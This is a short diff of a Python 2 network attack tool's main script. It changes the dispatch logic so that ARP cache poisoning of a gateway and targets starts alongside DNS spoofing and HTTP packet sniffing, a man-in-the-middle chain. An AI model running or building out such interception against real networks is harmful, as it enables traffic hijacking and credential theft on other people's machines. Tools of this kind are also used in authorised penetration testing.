@@ -159,15 +159,19 @@ if __name__ == '__main__':
 			spoof.stop()
 			print "[*] User requested shutdown."
 			sys.exit(1)
-	elif args.dnsspoof:
+	elif args.arpspoof and args.dnsspoof:
 		try:
                         myip = get_myip(interface)
+			mymac = get_mymac(interface)
+			from modules.arpoisoner import ARPspoof
+			spoof = ARPspoof(gateway, targets, interface, arpmode, myip, mymac)
+			spoof.start()
 			filter = "http"
 			from modules.dnspoisoner import DNSspoof
 			dnsspoof = DNSspoof(domain,myip)
 			dnsspoof.main()
 			from modules.sniffer import Sniffer
-			sniff = Sniffer(interface, filter)
+			sniff = Sniffer(interface, "http")
 			sniff.start()
 		except KeyboardInterrupt:
 			dnsspoof.stop()
@@ -175,14 +179,13 @@ if __name__ == '__main__':
 			sys.exit(1)
 
 	elif args.arpspoof:
-		try:	
+		try:
                         myip = get_myip(interface)
                         mymac = get_mymac(interface)
 			print "[*] Use --sniff to sniff intercepted packets, poisoning in threading."
 			from modules.arpoisoner import ARPspoof
 			spoof = ARPspoof(gateway,targets,interface,arpmode, myip, mymac)
 			spoof.start()
-			
 		except KeyboardInterrupt:
 			spoof.stop()
 			print "[*] User requested shutdown."
